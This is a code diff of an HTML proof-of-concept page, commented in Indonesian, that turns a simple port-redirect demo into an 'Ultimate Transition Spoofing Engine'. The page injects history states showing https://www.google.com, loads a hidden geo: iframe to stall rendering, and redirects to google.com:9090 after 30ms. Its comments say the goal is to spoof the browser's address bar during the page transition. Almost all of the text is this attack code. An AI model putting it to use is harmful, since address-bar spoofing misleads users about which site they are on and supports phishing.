@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Direct Port Redirect</title>
+    <title>Ultimate Transition Spoofing Engine</title>
     <style>
         body, html {
             margin: 0;
@@ -35,7 +35,7 @@
             max-width: 500px;
             width: 85%;
             background: #050505;
-            box-shadow: 0 0 20px rgba(0, 255, 102, 0.2);
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.3);
         }
         h3 {
             margin-top: 0;
@@ -50,15 +50,16 @@
             line-height: 1.4;
         }
         .highlight { color: #38bdf8; }
+        .spoof { color: #facc15; }
     </style>
 </head>
 <body>
 
     <div id="blackout-portal">
         <div class="console">
-            <h3>[!] Port Redirect Engine</h3>
+            <h3>[!] Transition Spoofing Active</h3>
             <div id="status-container">
-                <div class="log-line">> Menyiapkan target port buffer...</div>
+                <div class="log-line">> Mengunci state transisi omnibox...</div>
             </div>
         </div>
     </div>
@@ -66,32 +67,35 @@
     <script>
         const statusContainer = document.getElementById('status-container');
 
-        function addLog(text) {
+        function addLog(text, type = '') {
             const div = document.createElement('div');
-            div.className = 'log-line';
+            div.className = `log-line ${type}`;
             div.innerHTML = `> ${text}`;
             statusContainer.appendChild(div);
         }
 
         try {
-            // 1. Injeksi State Navigasi
-            history.pushState({race: true}, "", "/secure-gateway-auth");
-            addLog("History state disuntikkan: <span class='highlight'>/secure-gateway-auth</span>");
+            // 1. Double History State Lock untuk memicu jeda render visual pada indikator URL
+            history.pushState({transition: true}, "", "https://www.google.com");
+            history.replaceState({transition: true}, "", "https://www.google.com");
+            addLog("State transisi disuntikkan: <span class='highlight'>https://www.google.com</span>", "spoof");
 
-            // 2. Memicu subframe kosong untuk stabilitas render buffer
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = "about:blank";
-            document.body.appendChild(iframe);
+            // 2. Memicu iframe non-HTTP untuk menahan *render buffer* seluler
+            const frame = document.createElement('iframe');
+            frame.style.display = 'none';
+            frame.src = "geo:0,0?q=transition_lock";
+            document.body.appendChild(frame);
+            addLog("Subframe non-HTTP dilepaskan untuk menahan buffer.");
 
-            // 3. Auto-Redirect langsung ke google.com dengan port 9090 tanpa loading yang menggantung
+            // 3. Forced Port Swapping saat transisi indikator berjalan
+            // Mengalihkan langsung ke port target sebelum render DOM selesai sepenuhnya
             setTimeout(() => {
-                addLog("Mengarahkan ke google.com:9090...");
+                addLog("Memaksa swap port ke :9090...", "spoof");
                 window.location.replace("https://www.google.com:9090");
-            }, 100);
+            }, 30); // Jeda sangat singkat (30ms) untuk menangkap momen transisi loading awal
 
         } catch (err) {
-            addLog(`Kesalahan Eksekusi: ${err.message}`);
+            addLog(`Error Transisi: ${err.message}`, "highlight");
             window.location.href = "https://www.google.com:9090";
         }
     </script>
